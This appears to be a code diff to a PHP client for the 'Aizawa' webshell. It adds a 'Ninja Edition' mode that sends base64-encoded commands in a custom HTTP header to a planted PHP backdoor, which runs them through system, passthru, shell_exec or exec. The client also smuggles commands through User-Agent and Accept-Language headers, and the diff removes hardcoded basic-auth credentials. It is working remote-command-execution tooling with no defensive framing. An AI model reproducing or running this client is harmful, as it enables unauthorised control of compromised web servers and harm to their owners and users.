@@ -32,8 +32,6 @@ function http_user_agent($url, $cmd)
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     curl_setopt($ch, CURLOPT_USERAGENT, $cmd);
-    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
-    curl_setopt($ch, CURLOPT_USERPWD, '877404bee17727eb11292094341915de942c881b:e116e40e41cc86225be6aa85f29f33c54e55f3c6');
     $result = curl_exec($ch);
     curl_close($ch);
     return $result;
@@ -47,8 +45,19 @@ function http_accept_language($url, $cmd)
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Language: ' . $cmd));
-    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
-    curl_setopt($ch, CURLOPT_USERPWD, '877404bee17727eb11292094341915de942c881b:e116e40e41cc86225be6aa85f29f33c54e55f3c6');
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+function http_aizawa_ninja($url, $cmd)
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Aizawa-Ninja: ' . base64_encode($cmd)));
     $result = curl_exec($ch);
     curl_close($ch);
     return $result;
@@ -79,6 +88,19 @@ function execute($url, $cmd, $type)
         } else {
             return $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] . "\n";
         }
+    } elseif ($type == "http_aizawa_ninja") {
+        if (!empty(http_aizawa_ninja($url , "system~".$cmd))) {
+            return http_aizawa_ninja($url , "system~".$cmd);
+        } elseif (!empty(http_aizawa_ninja($url , "passthru~".$cmd))) {
+            return http_aizawa_ninja($url , "passthru~".$cmd);
+        } elseif (!empty(http_aizawa_ninja($url , "shell_exec~".$cmd))) {
+            return http_aizawa_ninja($url , "shell_exec~".$cmd);
+        } elseif (!empty(http_aizawa_ninja($url , "exec~".$cmd))) {
+            return http_aizawa_ninja($url , "exec~".$cmd);
+        } else {
+            return $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] . "\n";
+        }
+
     }
 }
 //--------------------------------------------------//
@@ -109,15 +131,13 @@ Please check the URL and dont change the filename
 $remove_cmd = preg_match('/^.*(?:\.)[a-zA-Z]+/m', $url, $matches);
 $url = $matches[0];
 //--------------------------------------------------//
-//       Check if URL http header is 200            //
+//       Check if URL http request is 200           //
 //--------------------------------------------------//
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
-curl_setopt($ch, CURLOPT_USERPWD, '877404bee17727eb11292094341915de942c881b:e116e40e41cc86225be6aa85f29f33c54e55f3c6');
 $result = curl_exec($ch);
 $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 curl_close($ch);
@@ -135,10 +155,13 @@ Please check the URL and dont change the filename
 $filename = substr($url, strrpos($url, '/') + 1);
 $hua = preg_match('/aizawa_hua_(.*)\.php/', $filename, $hua);
 $hal = preg_match('/aizawa_hal_(.*)\.php/', $filename, $hal);
+$ninja = preg_match('/aizawa_ninja_(.*)\.php/', $filename, $ninja);
 if ($hua) {
     $type = "http_user_agent";
 } elseif ($hal) {
     $type = "http_accept_language";
+} elseif ($ninja) {
+    $type = "http_aizawa_ninja";
 } else {
     print "
 $GLOBALS[bold]$GLOBALS[red]WARNING!$GLOBALS[clear]
@@ -162,6 +185,7 @@ $hostname = empty($hostname) ? "virtualesport" : $hostname;
 //--------------------------------------------------//
 //              Server information                  //
 //--------------------------------------------------//
+if(!$ninja) {
 $kernel = file_get_contents($url . "?unamea");
 $kernel = empty($kernel) ? $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $kernel . $GLOBALS["clear"];
 $disablefunc = file_get_contents($url . "?disable_functions");
@@ -184,6 +208,12 @@ Client IP    :  $cip
 Disable Func :  $disablefunc
 
 ";
+} else {
+print "
+$GLOBALS[green]Successfully connected to Aizawa Webshell Ninja Edition!$GLOBALS[clear]
+
+";
+}
 //--------------------------------------------------//
 //              Shell                               //
 //--------------------------------------------------//
